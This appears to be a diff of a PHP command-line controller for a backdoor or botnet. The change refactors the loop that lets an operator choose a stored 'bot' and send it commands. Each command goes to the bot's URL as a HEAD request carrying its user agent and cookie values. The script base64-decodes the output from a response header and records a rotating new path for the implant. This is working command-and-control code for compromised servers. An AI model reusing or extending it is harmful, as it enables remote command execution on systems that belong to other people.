@@ -134,40 +134,51 @@ while (true) {
             $type = readline("Which of the 3 options would you like to select (this will enter into a loop, so you can continue to execute commands press q to quit): ");
             do {
                 $bot = database->slopSqlite(['action' => "grabBot", "botID" => $selectedEntry]);
-                try {
-                    $action = readline("What would you like to execute (press q or quit to exit this loop): ");
-                    if ($action === "q" || $action === "quit"){
+                $action = readline("What would you like to execute: ");
+                switch (true) {
+                    case $action === "q":
+                    case $action === "quit":
+                        echo "Quitting.";
                         break;
-                    }
-                    if ($action === "clear"){
+                    case $action === "clear":
                         system(CLEAR);
-                    }
-                    $command = $coms->head($bot[0]['uri'],
-                        [
-                            'headers' => [
-                                "User-Agent" => $bot[0]['agent']
-                            ]
-                        ],
-                        [
-                            "cr" => $type,
-                            "command" => $action,
-                            "uuid" => $bot[0]['uuid'],
-                            "cname" => $bot[0]['cname'],
-                            "cval" => $bot[0]['cvalue'],
-                        ]
-                    );
-                } catch (Exception $e) {
-                    echo $e->getMessage() . PHP_EOL;
-                    readline("Exception occured....... Press enter to continue." . PHP_EOL);
-                    break;
-                }
-                if (!is_null($command->getHeaderLine('D'))) {
-                    database->slopSqlite(["action" => "updateBot", "botID" => $selectedEntry, "newUri" => sprintf("/%s", $command->getHeaderLine('NewName'))]);
-                    foreach (explode(":", base64_decode($command->getHeaderLine("D"))) as $output) {
-                        echo sprintf("\033[0;35m%s\033[0m", str_replace(";", "\n", trim($output))) . PHP_EOL;
-                    }
-                } else {
-                    echo "Command failed successfully....." . PHP_EOL;
+                        break;
+                    case $action === "help":
+                        echo <<<HELPER
+press \033[0;32mq\033[0m or \033[0;32mquit\033[0m to exit this loop.
+\033[0;33mclear\033[0m to clear the current screen.
+or \033[0;34mhelp\033[0m to show this message.
+HELPER.PHP_EOL;
+                        break;
+                    default:
+                        try {
+                            $command = $coms->head($bot[0]['uri'],
+                                [
+                                    'headers' => [
+                                        "User-Agent" => $bot[0]['agent']
+                                    ]
+                                ],
+                                [
+                                    "cr" => $type,
+                                    "command" => $action,
+                                    "uuid" => $bot[0]['uuid'],
+                                    "cname" => $bot[0]['cname'],
+                                    "cval" => $bot[0]['cvalue'],
+                                ]
+                            );
+                        } catch (Exception $e) {
+                            echo $e->getMessage() . PHP_EOL;
+                            readline("Exception occured....... Press enter to continue." . PHP_EOL);
+                            break;
+                        }
+                        if (!is_null($command->getHeaderLine('D'))) {
+                            database->slopSqlite(["action" => "updateBot", "botID" => $selectedEntry, "newUri" => sprintf("/%s", $command->getHeaderLine('NewName'))]);
+                            foreach (explode(":", base64_decode($command->getHeaderLine("D"))) as $output) {
+                                echo sprintf("\033[0;35m%s\033[0m", str_replace(";", "\n", trim($output))) . PHP_EOL;
+                            }
+                        } else {
+                            echo "Command failed successfully....." . PHP_EOL;
+                        }
                 }
             } while ($action !== "q");
         case str_starts_with($c, "a") !== false:
